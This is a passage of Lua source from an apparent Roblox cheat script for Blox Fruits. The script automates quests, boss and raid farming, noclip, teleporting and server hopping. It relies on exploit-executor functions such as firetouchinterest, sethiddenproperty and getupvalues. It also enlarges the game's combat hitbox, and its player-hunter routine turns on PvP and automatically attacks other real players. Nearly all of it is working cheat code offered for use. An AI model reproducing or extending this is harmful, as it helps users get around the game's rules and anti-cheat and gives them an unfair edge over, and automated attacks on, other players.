                                                    )
                                                end
                                            end
                                        end
                                        
                                    elseif game.ReplicatedStorage.Remotes.CommF_:InvokeServer("ProQuestProgress", "RichSon") == 0 then
                                        print("nung 3")
                                        if
                                            game.ReplicatedStorage:FindFirstChild("Mob Leader [Lv. 120] [Boss]") or
                                                game.workspace.Enemies:FindFirstChild("Mob Leader [Lv. 120] [Boss]")
                                         then
                                            coountsaber1 = 1
                                            local folder = game.workspace.Enemies
                                            if game.ReplicatedStorage:FindFirstChild("Mob Leader [Lv. 120] [Boss]") then
                                                folder = game.ReplicatedStorage
                                            end
                                            for i, v in next, folder:GetChildren() do
                                                if v.Name == "Mob Leader [Lv. 120] [Boss]" and v.Humanoid.Health > 0 then
                                                    repeat
                                                        repeat task.wait()
                                                            donandngu2 = v
                                                            EnableBuso()
                                                            EquipWeapon()
                                                            Tweento(donandngu2.HumanoidRootPart.CFrame * CFrame.new(0,40,0))
                                                            UseFastAttack = true
                                                        until not v or not v:FindFirstChild("Humanoid") or not v:FindFirstChild("HumanoidRootPart") or v.Humanoid.Health <= 0 
                                                        UseFastAttack = false
                                                    until not v or not v.Parent or v.Humanoid.Health == 0
                                                end
                                            end
                                        else
                                            
                                        end
                                    elseif game.ReplicatedStorage.Remotes.CommF_:InvokeServer("ProQuestProgress", "RichSon") == 1 then
                                        print("nung 4")
                                        if
                                            not game:GetService("Players").LocalPlayer.Character:FindFirstChild("Relic") and
                                                not game:GetService("Players").LocalPlayer.Backpack:FindFirstChild("Relic")
                                         then
                                            if
                                                (game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position -
                                                    CFrame.new(
                                                        -1404.07996,
                                                        29.8520069,
                                                        5.26677656,
                                                        0.888123989,
                                                        -4.0340602e-09,
                                                        0.459603906,
                                                        7.5884703e-09,
                                                        1,
                                                        -5.8864642e-09,
                                                        -0.459603906,
                                                        8.71560069e-09,
                                                        0.888123989
                                                    )).Magnitude > 8
                                             then
                                                Tweento(CFrame.new(
                                                    -1404.07996,
                                                    29.8520069,
                                                    5.26677656,
                                                    0.888123989,
                                                    -4.0340602e-09,
                                                    0.459603906,
                                                    7.5884703e-09,
                                                    1,
                                                    -5.8864642e-09,
                                                    -0.459603906,
                                                    8.71560069e-09,
                                                    0.888123989
                                                ))
                                            else
                                                game.ReplicatedStorage.Remotes.CommF_:InvokeServer("ProQuestProgress", "RichSon")
                                            end
                                        else
                                            EquipWeaponName("Relic")
                                            toTarget(
                                                game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position,
                                                CFrame.new(-1405.3677978516, 29.977333068848, 4.5685839653015).Position,
                                                CFrame.new(-1405.3677978516, 29.977333068848, 4.5685839653015)
                                            )
                                        end
                                    end
                                else
                                    print("nung 2")
                                    if
                                        not game:GetService("Players").LocalPlayer.Character:FindFirstChild("Torch") and
                                            not game:GetService("Players").LocalPlayer.Backpack:FindFirstChild("Torch")
                                     then
                                        Tweento(game:GetService("Workspace").Map.Jungle.Torch.CFrame)
                                    else
                                        EquipWeaponName("Torch")
                                        if
                                            (game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position - game:GetService("Workspace").Map.Desert.Burn.Fire.Position).Magnitude < 3
                                         then
                                            firetouchinterest(game.Players.LocalPlayer.Character.Torch.Handle, game:GetService("Workspace").Map.Desert.Burn.Fire, 0)
                                            firetouchinterest(game.Players.LocalPlayer.Character.Torch.Handle, game:GetService("Workspace").Map.Desert.Burn.Fire, 1)
                                         else
                                            Tweento(game:GetService("Workspace").Map.Desert.Burn.Fire.CFrame)
                                        end                                   
                                    end
                                end
                            end
                        else
                            if CheckBoss("Saber Expert [Lv. 200] [Boss]")
                             then
                                donandngu2 = CheckBoss("Saber Expert [Lv. 200] [Boss]")
                                
                                if game.workspace.Enemies:FindFirstChild(donandngu2.Name) then 
                                    for i,v in pairs(game.Workspace.Enemies:GetChildren()) do 
                                        if v.Name == donandngu2.Name then 
                                            repeat task.wait()
                                                donandngu2 = CheckBoss("Saber Expert [Lv. 200] [Boss]")
                                                EnableBuso()
                                                EquipWeapon()
                                                Tweento(v.HumanoidRootPart.CFrame * CFrame.new(0,40,0))
                                                UseFastAttack = true
                                            until not v or not v:FindFirstChild("Humanoid") or not v:FindFirstChild("HumanoidRootPart") or v.Humanoid.Health <= 0 
                                            UseFastAttack = false
                                        end
                                    end
                                else
                                    spawn(Tweento(donandngu2.HumanoidRootPart.CFrame * CFrame.new(0,40,0)),1)
                                end
                            else
                                if Settings["HopOption"] then 
                                    HopServer()
                                end
                            end
                        end
                    end
                end)
            elseif Sea1 and Settings["Auto Sea 2"] and not Sea2Ed and LocalPlayerLevelValue >= 700 then 
                if game.PlaceId == 2753915549 then
                    if
                        LocalPlayerLevelValue >= 700 and
                            game.ReplicatedStorage.Remotes.CommF_:InvokeServer("DressrosaQuestProgress", "Dressrosa") ~= 0
                     then
                        
                        if LocalPlayerLevelValue >= 700 and game.Workspace.Map.Ice.Door.CanCollide then
                            if
                                not game:GetService("Players").LocalPlayer.Character:FindFirstChild("Key") and
                                    not game:GetService("Players").LocalPlayer.Backpack:FindFirstChild("Key")
                             then
                                if
                                    (CFrame.new(4852.2895507813, 5.651451587677, 718.53070068359).Position -
                                        game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position).magnitude < 5
                                 then
                                    game.ReplicatedStorage.Remotes["CommF_"]:InvokeServer("DressrosaQuestProgress", "Detective")
                                    EquipWeaponName("Key")
                                else
                                    Tweento(CFrame.new(4852.2895507813, 5.651451587677, 718.53070068359))
                                end
                            else
                                EquipWeaponName("Key")
                                if game:GetService("Players").LocalPlayer.Character:FindFirstChild("Key") then
                                    Tweento(game.Workspace.Map.Ice.Door.CFrame)
                                end
                            end
                        elseif not game.Workspace.Map.Ice.Door.CanCollide then
                            Target = ReturnBosses("Ice Admiral [Lv. 700] [Boss]")
                            repeat
                                pcall(
                                    function()
                                        if game.Workspace.Enemies:FindFirstChild(Target.Name) then
                                            EnableBuso()
                                            EquipWeapon()
                                            spawn(Tweento(Target.HumanoidRootPart.CFrame * CFrame.new(0, 40, 0)), 1)
                                            UseFastAttack = true
                                        else
                                            Tweento(Target.HumanoidRootPart.CFrame * CFrame.new(0, 40, 0))
                                            NoClip = true
                                        end
                                        task.wait()
                                    end
                                )
                            until not Target
                        end
                    elseif game.ReplicatedStorage.Remotes.CommF_:InvokeServer("DressrosaQuestProgress", "Dressrosa") == 0 then
                        TeleportSea(2)
                        AutoSea2_Toggle:Set(false)
                    end
                end
            elseif (Sea2 or Sea3) and Settings["Auto Raid"] and (CheckTool("Special Microchip") or CheckIsRaiding() )then
                print('raid ngu')
                sethiddenproperty(game.Players.LocalPlayer, "SimulationRadius", math.huge)
                NoClip = true
                if game.Players.LocalPlayer.PlayerGui.Main.Timer.Visible then  
                    wait(10)
                elseif CheckTool("Special Microchip") then 
                    if Sea2 then
                        fireclickdetector(Workspace.Map.CircleIsland.RaidSummon2.Button.Main.ClickDetector)
                    elseif Sea3 then
                        fireclickdetector(Workspace.Map["Boat Castle"].RaidSummon2.Button.Main.ClickDetector)
                    end
                    repeat task.wait() spawn(function() tween:Cancel() end) until not game.Players.LocalPlayer or not Settings["Auto Raid"] or game.Players.LocalPlayer.PlayerGui.Main.Timer.Visible
                elseif not CheckTool("Special Microchip") then 
                    v282 =
                        game.ReplicatedStorage.Remotes.CommF_:InvokeServer(
                        "RaidsNpc",
                        "Select",
                        Settings["ChoosenRaid"]
                    )
                    wait(2)
                end
            elseif Sea3 and Settings["Auto Elite"] and (CheckElite() or Settings["HopOption"]) then 
                if CheckEliteSafe() then 
                    Tweento(CFrame.new(-5058.77490234375, 314.5155029296875, -3155.88330078125))
                else
                    mobngu = CheckElite()
                    if mobngu then 
                        if not string.find(game.Players.LocalPlayer.PlayerGui.Main.Quest.Container.QuestTitle.Title.Text,CheckElite().Name:gsub(" %pLv. %d+%p", ""))  or not game:GetService("Players").LocalPlayer.PlayerGui.Main.Quest.Visible then 
                            game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("EliteHunter")
                        end
                        if game.Workspace.Enemies:FindFirstChild(mobngu.Name) then 
                            KillMobReal(mobngu)
                        else
                            spawn(Tweento(mobngu.HumanoidRootPart.CFrame * CFrame.new(0,60,0)),1)
                            NoClip = true 
                        end
                    elseif Settings["HopOption"] then 
                        Notify("Script Notify","Start Hopping for finding Elite...")
                        HopServer()
                    end
                end
            elseif Sea3 and Settings["Auto Pirate Raid"] and CheckMobPirateRaid() and not CheckEliteSafe() then
                mobngu = CheckMobPirateRaid() 
                if game.Workspace.Enemies:FindFirstChild(mobngu.Name) then 
                    KillMobReal(mobngu)
                else
                    spawn(Tweento(mobngu.HumanoidRootPart.CFrame * CFrame.new(0,60,0)),1)
                    NoClip = true 
                end
            elseif Sea3 and Settings["AutoDoughKing"] and not CheckEliteSafe() then 
                if
                    game.Players.LocalPlayer.Backpack:FindFirstChild("Red Key") or
                        game.Players.LocalPlayer.Character:FindFirstChild("Red Key")
                then
                    game.ReplicatedStorage.Remotes.CommF_:InvokeServer("RaidsNpc", "Select", "Dough")
                    wait(1)
                end

                if CheckMob(DoughBoss, true) then
                    ngu = CheckMob(DoughBoss, true)
                    if game.Workspace.Enemies:FindFirstChild(ngu.Name) then
                        KillMobReal(ngu)
                    elseif game.ReplicatedStorage:FindFirstChild(ngu.Name) then
                        EnableBuso()
                        EquipWeapon()
                        spawn(pcall(Tweento(ngu.HumanoidRootPart.CFrame * CFrame.new(0, 50, 0)), 1), 1)
                        NoClip = true
                    end
                else
                    if
                        not game.Players.LocalPlayer.Backpack:FindFirstChild("Sweet Chalice") and
                            not game.Players.LocalPlayer.Character:FindFirstChild("Sweet Chalice")
                    then
                        if
                            game.ReplicatedStorage.Remotes.CommF_:InvokeServer("SweetChaliceNpc") ==
                                "Where are the items?"
                        then
                            if CheckMaterialCount("Conjured Cocoa") >= 10 then
                                if
                                    not game.Players.LocalPlayer.Backpack:FindFirstChild("God's Chalice") and
                                        not game.Players.LocalPlayer.Character:FindFirstChild("God's Chalice")
                                then
                                    if CheckMob(Elites, true) then
                                        Notify("Script Status", "Found Elite Boss")
                                        repeat
                                            if
                                                not string.find(
                                                    game.Players.LocalPlayer.PlayerGui.Main.Quest.Container.QuestTitle.Title.Text,
                                                    CheckMob(Elites, true).Name:gsub(" %pLv. %d+%p", "")
                                                ) or
                                                    not game:GetService("Players").LocalPlayer.PlayerGui.Main.Quest.Visible
                                            then
                                                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer(
                                                    "AbandonQuest"
                                                )
                                                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer(
                                                    "EliteHunter"
                                                )
                                            else
                                                ngu = CheckMob(Elites, true)
                                                if game.Workspace.Enemies:FindFirstChild(ngu.Name) then
                                                    KillMob(ngu)
                                                elseif game.ReplicatedStorage:FindFirstChild(ngu.Name) then
                                                    EnableBuso()
                                                    EquipWeapon()
                                                    spawn(
                                                        pcall(
                                                            Tweento(ngu.HumanoidRootPart.CFrame * CFrame.new(0, 50, 0)),
                                                            1
                                                        ),
                                                        1
                                                    )
                                                    NoClip = true
                                                end
                                            end
                                        until not Settings["AutoDoughKing"] or not CheckMob(Elites, true)
                                    elseif Settings["HopOption"] then
                                        Notify("Script Status", "Not Found Elite Boss,\nStart Hopping...")
                                        HopServer()
                                    end
                                else
                                    game.ReplicatedStorage.Remotes.CommF_:InvokeServer("SweetChaliceNpc")
                                end
                            else
                                KillMob(CocoaMobs, true)
                            end
                        end
                    else
                        game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("CakePrinceSpawner")
                        if not CheckMob(DoughBoss, true) then
                            KillMob(MobsCakePrince, true)
                        end
                    end
                end
            elseif Sea2 and Settings["Auto Factory"] and CheckFactory() then
                if game.Workspace.Enemies:FindFirstChild("Core") then 
                    KillMob(CheckFactory())
                else 
                    spawn(Tweento(CheckFactory()).HumanoidRootPart.CFrame * CFrame.new(0,40,0),1)
                end
            elseif Settings["Auto Farm Boss"] and Settings["Selected Boss"] and (ReturnBosses(tostring(Settings["Selected Boss"])) or Settings["HopOption"]) and not CheckEliteSafe() then 
                if Settings["Auto Quest Boss"] then 
                    print('beo 1 ')
                    if CheckQuestBoss(Settings["Selected Boss"]) and ReturnBosses(Settings["Selected Boss"]) then 
                        print('beo 2 ')
                        if GetInfoBossQuest(CheckQuestBoss(Settings["Selected Boss"])) then
                            print('beo 3 ')
                            conchomeci = GetInfoBossQuest(CheckQuestBoss(Settings["Selected Boss"]))
                            for i,v in pairs(conchomeci) do print(i,v) end
                            if (not string.find(game.Players.LocalPlayer.PlayerGui.Main.Quest.Container.QuestTitle.Title.Text, CheckQuestBoss(Settings["Selected Boss"]))  and game.Players.LocalPlayer.PlayerGui.Main.Quest.Visible)  or not game.Players.LocalPlayer.PlayerGui.Main.Quest.Visible then 
                                print('beo 4 ')
                                if (QuestPoint[conchomeci["QuestName"]].Position-game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude <= 8 then 
                                    game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("StartQuest", tostring(conchomeci["QuestName"]), conchomeci["QuestId"])
                                else
                                    Tweento(QuestPoint[conchomeci["QuestName"]])
                                    NoClip = true
                                end
                            elseif ReturnBosses(Settings["Selected Boss"]) then 
                                print('beo 5 ')
                                spawn(EnableBuso(),1)
                                spawn(EquipWeapon(),1)
                                v = ReturnBosses(Settings["Selected Boss"])
                                if v then 
                                    if game.Workspace.Enemies:FindFirstChild(v.Name) then 
                                        KillMobReal(v)
                                    else
                                        spawn(pcall(Tweento(v.HumanoidRootPart.CFrame * CFrame.new(0,40,0)),1),1)
                                        NoClip = true 
                                    end
                                end
                            end
                        elseif ReturnBosses(Settings["Selected Boss"]) then 
                            spawn(EnableBuso(),1)
                            spawn(EquipWeapon(),1)
                            v = ReturnBosses(Settings["Selected Boss"])
                            if v then 
                                if game.Workspace.Enemies:FindFirstChild(v.Name) then 
                                    KillMobReal(v)
                                else
                                    spawn(pcall(Tweento(v.HumanoidRootPart.CFrame * CFrame.new(0,40,0)),1),1)
                                    NoClip = true 
                                end
                            end
                        end
                    elseif ReturnBosses(Settings["Selected Boss"]) then 
                        spawn(EnableBuso(),1)
                        spawn(EquipWeapon(),1)
                        v = ReturnBosses(Settings["Selected Boss"])
                        if v then 
                            if game.Workspace.Enemies:FindFirstChild(v.Name) then 
                                KillMobReal(v)
                            else
                                spawn(pcall(Tweento(v.HumanoidRootPart.CFrame * CFrame.new(0,40,0)),1),1)
                                NoClip = true 
                            end
                        end
                    end
                elseif ReturnBosses(Settings["Selected Boss"]) then 
                    spawn(EnableBuso(),1)
                    spawn(EquipWeapon(),1)
                    v = ReturnBosses(Settings["Selected Boss"])
                    if v then 
                        if game.Workspace.Enemies:FindFirstChild(v.Name) then 
                            KillMobReal(v)
                        else
                            spawn(pcall(Tweento(v.HumanoidRootPart.CFrame * CFrame.new(0,40,0)),1),1)
                            NoClip = true 
                        end
                    end
                end
            elseif Settings["Farm"] and not CheckEliteSafe() then
                pcall(
                    function()
                        if Settings["MethodFarm"] == "Level" then
                            if
                                game.PlaceId == 2753915549 and not getgenv().QuestKillPlayer and
                                    LocalPlayerLevelValue >= 35
                             then
                                game.ReplicatedStorage.Remotes["CommF_"]:InvokeServer("PlayerHunter")
                                local namequest =
                                    string.gsub(
                                    game:GetService("Players").LocalPlayer.PlayerGui.Main.Quest.Container.QuestTitle.Title.Text,
                                    "Defeat ",
                                    ""
                                )
                                namequest = string.gsub(namequest, " %p(0/1)%p", "")
                                if
                                    game:GetService("Players").LocalPlayer.PlayerGui.Main:FindFirstChild("Quest").Visible and
                                        namequest and
                                        game:GetService("Workspace").Characters:FindFirstChild(namequest)
                                 then
                                    getgenv().QuestKillPlayer = true
                                    return
                                end
                            end
                            if getgenv().QuestKillPlayer then 
                                if #blnamequest >= 6 and getgenv().QuestKillPlayer then
                                    if getgenv().QuestKillPlayer then
                                        Notify("gg","Start Hop Server")
                                        local mbmbmb = tick()
                                        repeat
                                            wait()
                                        until tick() - mbmbmb >= 3
                                        HopServer()
                                    end
                                        return
                                    end
                                    if game:GetService("Players").LocalPlayer.PlayerGui.Main:FindFirstChild("Quest").Visible then
                                        local namequest =
                                            string.gsub(
                                            game:GetService("Players").LocalPlayer.PlayerGui.Main.Quest.Container.QuestTitle.Title.Text,
                                            "Defeat ",
                                            ""
                                        )
                                        namequest = string.gsub(namequest, " %p(0/1)%p", "")
                                        if
                                            game:GetService("Players").LocalPlayer.PlayerGui.Main:FindFirstChild("Quest").Visible and
                                                not game:GetService("Workspace").Characters:FindFirstChild(namequest)
                                        then
                                            game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("AbandonQuest")
                                        end
                                        print(game.Players[namequest].Data.Level.Value)
                                        if game.Players[namequest].Data.Level.Value < 20 or game.Players[namequest].Data.Level.Value >= 150 then
                                            table.insert(blnamequest, namequest)
                                            game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("AbandonQuest")
                                        end
                                        if game:GetService("Players").LocalPlayer.PlayerGui.Main:FindFirstChild("Quest").Visible then
                                            for i, v in next, game:GetService("Workspace").Characters:GetChildren() do
                                                if v:IsA("Model") and v.Name == namequest then
                                                    EnableBuso()
                                                    EquipWeapon()
                                                    repeat
                                                        wait()
                                                        if game.Players.LocalPlayer.PlayerGui.Main.PvpDisabled.Visible then
                                                            game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("EnablePvp")
                                                        end
                                                        spawn(
                                                            function()
                                                                EquipWeapon()
                                                                EnableBuso()
                                                                if
                                                                    getgenv().clickattackmethodfarm and
                                                                        (v.HumanoidRootPart.Position -
                                                                            game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position).Magnitude <
                                                                            50
                                                                then
                                                                    local loa =
                                                                        getupvalues(
                                                                        require(
                                                                            game:GetService("Players").LocalPlayer.PlayerScripts.CombatFramework
                                                                        )
                                                                    )[2]
                                                                    loa.activeController.hitboxMagnitude = 55
                                                                    Click()
                                                                    SendKey("Z")
                                                                    SendKey("X")
                                                                    SendKey("V")
                                                                    UseFastAttack = true
                                                                end
                                                            end
                                                        )
                                                        spawn(
                                                            function()
                                                                if
                                                                    not getgenv().clickattackmethodfarm and
                                                                        (v.HumanoidRootPart.Position -
                                                                            game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position).Magnitude <
                                                                            150
                                                                then
                                                                    local condimemeay = tick()
                                                                    repeat
                                                                        wait()
                                                                    until tick() - condimemeay >= 5 or
                                                                        (v.HumanoidRootPart.Position -
                                                                            game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position).Magnitude >=
                                                                            300
                                                                    if tick() - condimemeay >= 5 then
                                                                        getgenv().clickattackmethodfarm = true
                                                                    end
                                                                elseif
                                                                    (v.HumanoidRootPart.Position -
                                                                        game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position).Magnitude >=
                                                                        500
                                                                then
                                                                    getgenv().clickattackmethodfarm = false
                                                                end
                                                            end
                                                        )
                                                        if not getgenv().clickattackmethodfarm then
                                                            spawn(function()
                                                                Tweento(v.HumanoidRootPart.CFrame * CFrame.new(-40, 0, 0))
                                                            end)
                                                        else
                                                            spawn(function()
                                                                Tweento(v.HumanoidRootPart.CFrame * CFrame.new(2.5, 0, 0))
                                                            end)
                                                        end
                                                    until not v or not v.Parent or v.Humanoid.Health <= 0 or not Settings["Farm"] or
                                                        not game:GetService("Players").LocalPlayer.PlayerGui.Main:FindFirstChild("Quest").Visible or
                                                        CheckSafeZone(v)
                                                    getgenv().clickattackmethodfarm = false
                                                    UseFastAttack = false
                                                    table.insert(blnamequest, namequest)
                                                end
                                            end
                                        end
                                    else
                                        if
                                            game.ReplicatedStorage.Remotes["CommF_"]:InvokeServer("PlayerHunter") ==
                                                "I don't have anything for you right now. Come back later."
                                        then
                                            getgenv().QuestKillPlayer = false
                                        end
                                    end
                                end
                            if not getgenv().QuestKillPlayer then
                                if
                                    game.PlaceId == 2753915549 and game.Players.LocalPlayer.Data.Level.Value < 120 and
                                        game.Players.LocalPlayer.Data.Level.Value >= 10
                                 then
                                    if not MobLevelSkip() then
                                        print("Mm")
                                        for i, v in pairs(MBLVSKIP) do
                                            mm = game.workspace.MobSpawns:FindFirstChild(v)
                                            if mm and not MobLevelSkip() and Settings["Farm"] then
                                                Tweento(GetMobSpawn(v).CFrame * CFrame.new(0, 15, 8))
                                                concac2 = Instance.new("Part")
                                                concac2.Parent = GetMobSpawn(v)
                                                concac2.Name = "concac2"
                                            elseif not mm then
                                                FunctionFoldermob()
                                            end
                                        end
                                        Tweento(CFrame.new(-7620.41, 5545.49, -504.215))
                                        task.wait(2)
                                        if not MobLevelSkip() then
                                            Tweento(CFrame.new(-7782.86, 5632.42, -1268.59))
                                            task.wait(2)
                                        end
                                    else
                                        print('ma me may meci')
                                        for i, v in pairs(game.workspace.Enemies:GetChildren()) do
                                            if
                                                Settings["Farm"] and Settings["MethodFarm"] == "Level" and
                                                    v.Name == MobLevelSkip() and
                                                    v:FindFirstChild("HumanoidRootPart") and
                                                    v:FindFirstChild("Humanoid") and
                                                    v.Humanoid.Health > 0
                                             then
                                                repeat
                                                    KillMob(v)
                                                until not Settings["Farm"] or Settings["MethodFarm"] ~= "Level" or not v or
                                                    not v:FindFirstChild("Humanoid") or
                                                    not v:FindFirstChild("HumanoidRootPart") or
                                                    v.Humanoid.Health <= 0
                                                NoClip = false
                                            end
                                        end
                                    end
                                elseif game.Players.LocalPlayer.PlayerGui.Main:FindFirstChild("Quest").Visible then
                                    if not MobLevel1OrMobLevel2() then
                                        Check155 = tick()
                                        Check156 = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
                                        p2 = GetMobSpawnList(GetMob())
                                        if tick()-Check155 >= 3*60 and (game.Players.LocalPlayer.Character.HumanoidRootPart.Position-Check156.Position).Magnitude <= 1500 then 
                                            Rejoin()
                                        else
                                            for i, v in pairs(p2) do
                                                pcall(
                                                    function()
                                                        if not MobLevel1OrMobLevel2() and Settings["Farm"] then
                                                            if
                                                                not game.Players.LocalPlayer.PlayerGui.Main:FindFirstChild(
                                                                    "Quest"
                                                                ).Visible
                                                             then
                                                                repeat
                                                                    wait()
                                                                until game.Players.LocalPlayer.PlayerGui.Main:FindFirstChild(
                                                                    "Quest"
                                                                ).Visible
                                                            end
                                                            Tweento(v.CFrame * CFrame.new(0, 25, 8))
                                                            NoClip = true
                                                            if
                                                                (game.Players.LocalPlayer.Character.HumanoidRootPart.Position -
                                                                    v.Position).Magnitude < 30 and
                                                                    not v:FindFirstChild("mmb")
                                                             then
                                                            end
                                                        end
                                                    end
                                                )
                                            end
                                        end
                                    else
                                        for i, v in pairs(game.workspace.Enemies:GetChildren()) do
                                            if
                                                v.Name == MobLevel1OrMobLevel2() and
                                                    v:FindFirstChild("HumanoidRootPart") and
                                                    v:FindFirstChild("Humanoid") and
                                                    v.Humanoid.Health > 0
                                             then
                                                repeat
                                                    KillMob(v)
                                                until not Settings["Farm"] or Settings["MethodFarm"] ~= "Level" or not v or
                                                    not v:FindFirstChild("Humanoid") or
                                                    not v:FindFirstChild("HumanoidRootPart") or
                                                    v.Humanoid.Health <= 0 or
                                                    not game.Players.LocalPlayer.PlayerGui.Main:FindFirstChild("Quest").Visible
                                                MasteryMobParent = nil
                                                StartBringMob = false
                                                UseFastAttack = false
                                                ----print("Turn Off Fast Attack17")
                                                NoClip = false
                                            end
                                        end
                                    end
                                else
                                    GetQuest()
                                end
                            end
                        elseif Settings["MethodFarm"] == "Cake Prince" then
                            if getCakePrince() then
                                Target = getCakePrince()
                                if Target then
                                    if game.Workspace.Enemies:FindFirstChild(Target.Name) then
                                        repeat
                                            EnableBuso()
                                            EquipWeapon()
                                            pcall(
                                                function()
                                                    wait()
                                                    Tweento(Target.HumanoidRootPart.CFrame * RandomCFrame)
                                                    UseFastAttack = true
                                                end
                                            )
                                        until not Target or Settings["MethodFarm"] ~= "Cake Prince" or
                                            not Settings["Farm"] or
                                            not getCakePrince()
                                        UseFastAttack = false
                                    else
                                        EnableBuso()
                                        EquipWeapon()
                                        Tweento(Target.HumanoidRootPart.CFrame * RandomCFrame)
                                    end
                                end
                            else
                                game.ReplicatedStorage.Remotes.CommF_:InvokeServer("CakePrinceSpawner")
                                if getCakePrince() then
                                else
                                    Check155 = tick()
                                    Check156 = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
                                    if not getCakePrinceMobs() then
                                        repeat wait()
                                            if tick()-Check155 >= 90 and (game.Players.LocalPlayer.Character.HumanoidRootPart.Position-Check156.Position).Magnitude <= 1500 then 
                                                HopServer()
                                                Rejoin()
                                            else
                                                for i, v in pairs(MobsCakePrinceSpawns) do
                                                    mm = GetMobSpawn(v)
                                                    if mm and not getCakePrinceMobs() and Settings["Farm"] then
                                                        Tweento(GetMobSpawn(v).CFrame * CFrame.new(0, 15, 8))
                                                        ticknew = tick()
                                                        repeat 
                                                            if tick()-ticknew>=10 then
                                                                NoClip = false 
                                                                task.wait()
                                                            else
                                                                NoClip = true 
                                                                task.wait()
                                                            end
                                                        until tick()-ticknew>=30 or getCakePrinceMobs()
                                                        NoClip = false
                                                    elseif not mm then
                                                        FunctionFoldermob()
                                                    end
                                                end
                                            end
                                        until getCakePrinceMobs() or getCakePrince() or not Settings["Farm"] or Settings["MethodFarm"] ~= "Cake Prince" 
                                        Check155 = nil 
                                        Check156 = nil
                                    elseif getCakePrinceMobs() then
                                        for i, v in pairs(game.workspace.Enemies:GetChildren()) do
                                            if
                                                v.Name == getCakePrinceMobs() and v:FindFirstChild("HumanoidRootPart") and
                                                    v:FindFirstChild("Humanoid") and
                                                    v.Humanoid.Health > 0
                                             then
                                                local BV = Instance.new("Part")
                                                BV.Parent = v
                                                BV.Name = "cailonquegidoditmemay"
                                                repeat
                                                    KillMob(v)
                                                until not Settings["Farm"] or Settings["MethodFarm"] ~= "Cake Prince" or
                                                    not v or
                                                    not v:FindFirstChild("Humanoid") or
                                                    not v:FindFirstChild("HumanoidRootPart") or
                                                    v.Humanoid.Health <= 0
                                                MasteryMobParent = nil
                                                StartBringMob = false
                                                UseFastAttack = false
                                                ----print("Turn Off Fast Attack18")
                                                NoClip = false
                                            end
                                        end
                                    end
                                end
                            end
                        elseif Settings["MethodFarm"] == "Bone" then
                            TeleportSea(3)
                            if getBoneMob() then
                                v = getBoneMob()
                                if v then
                                    repeat
                                        KillMob(v)
                                    until not Settings["Farm"] or Settings["MethodFarm"] ~= "Bone" or not v or
                                        not v:FindFirstChild("Humanoid") or
                                        not v:FindFirstChild("HumanoidRootPart") or
                                        v.Humanoid.Health <= 0
                                    MasteryMobParent = nil
                                    StartBringMob = false
                                    UseFastAttack = false
                                    ----print("Turn Off Fast Attack19")
                                    NoClip = false
                                end
                            else
                                Check155 = tick()
                                Check156 = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
                                repeat wait()
                                    if tick()-Check155 >= 3*60 and (game.Players.LocalPlayer.Character.HumanoidRootPart.Position-Check156.Position).Magnitude <= 1500 then 
                                        Rejoin()
                                    else
                                        for i, v in pairs(BoneMobsSpawns) do
                                            mm = game.workspace.MobSpawns:FindFirstChild(v)
                                            if mm and not getBoneMob() and Settings["Farm"] then
                                                print(v)
                                                print(type(GetMobSpawn(v)))
                                                Tweento(GetMobSpawn(v).CFrame * CFrame.new(0, 15, 8))
                                                concac2 = Instance.new("Part")
                                                concac2.Parent = GetMobSpawn(v)
                                                concac2.Name = "concac2"
                                            elseif not mm then
                                                FunctionFoldermob()
                                            end
                                        end
                                    end
                                until getBoneMob() or not Settings["Farm"] or Settings["MethodFarm"] ~= "Bone" 
                                Check155 = nil 
                                Check156 = nil
                            end
                        end
                    end
                )
            end
        end
    end
)
function IsMirageIsland()
    if game:GetService("Workspace").Map:FindFirstChild("MysticIsland") then
        return "```true```"
    else
        return "```false```"
    end
end
function function7()
    GameTime = "Error"
    local c = game.Lighting
    local c2 = c.ClockTime
    if c2 >= 18 or c2 < 5 then
        GameTime = "Night"
    else
        GameTime = "Day"
    end
    return GameTime
end
function function6()
    return math.floor(game.Lighting.ClockTime)
end
function getServerTime()
    RealTime = tostring(math.floor(game.Lighting.ClockTime * 100) / 100)
    RealTime = tostring(game.Lighting.ClockTime)
    RealTimeTable = RealTime:split(".")
    Minute, Second = RealTimeTable[1], tonumber((0 + tonumber(RealTimeTable[2] / 100))) * 60
    return Minute, Second
end
function function8()
    local c = game.Lighting
    local c2 = c.ClockTime
    if CheckMoon() == "Full Moon" and c2 <= 5 then
        return tostring(function6()) .. " ( Will End Moon In " .. math.floor(5 - c2) .. " Minutes )"
    elseif CheckMoon() == "Full Moon" and (c2 > 5 and c2 < 12) then
        return tostring(function6()) .. " ( Fake Moon )"
    elseif CheckMoon() == "Full Moon" and (c2 > 12 and c2 < 18) then
        return tostring(function6()) .. " ( Will Full Moon In " .. math.floor(18 - c2) .. " Minutes )"
    elseif CheckMoon() == "Full Moon" and (c2 > 18 and c2 <= 24) then
        return tostring(function6()) .. " ( Will End Moon In " .. math.floor(24 + 6 - c2) .. " Minutes )"
    end
    if CheckMoon() == "Next Night" and c2 < 12 then
        return tostring(function6()) .. " ( Will Full Moon In " .. math.floor(18 - c2) .. " Minutes )"
    elseif CheckMoon() == "Next Night" and c2 > 12 then
        return tostring(function6()) .. " ( Will Full Moon In " .. math.floor(18 + 12 - c2) .. " Minutes )"
    end
    return tostring(function6())
end
function SkidSeaHub1()
    text1 = "**Informations**\n"
    text1 = text1 .. game.Players.NumPlayers .. "/12"
    if game.Players.NumPlayers < 12 then
        text1 = text1 .. ":green_circle:"
    else
        text1 = text1 .. ":red_circle:"
    end
